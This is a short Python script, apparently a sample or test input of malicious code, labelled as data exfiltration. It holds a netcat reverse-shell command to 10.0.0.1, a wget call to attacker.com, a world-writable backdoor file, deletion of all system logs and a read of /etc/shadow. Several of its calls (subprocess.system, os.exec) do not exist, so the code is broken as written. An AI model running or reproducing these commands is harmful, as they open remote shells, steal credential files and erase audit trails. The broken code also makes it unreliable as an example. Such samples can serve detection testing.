import os
import subprocess

# Exfiltrate sensitive data
subprocess.system("cat /etc/passwd | nc -e /bin/bash 10.0.0.1 9999")
os.exec("wget http://attacker.com/data")
subprocess.call("chmod 777 /tmp/backdoor", shell=True)
subprocess.call("rm -rf /var/log/*", shell=True)
with open("/etc/shadow", "r") as f:
    data = f.read()
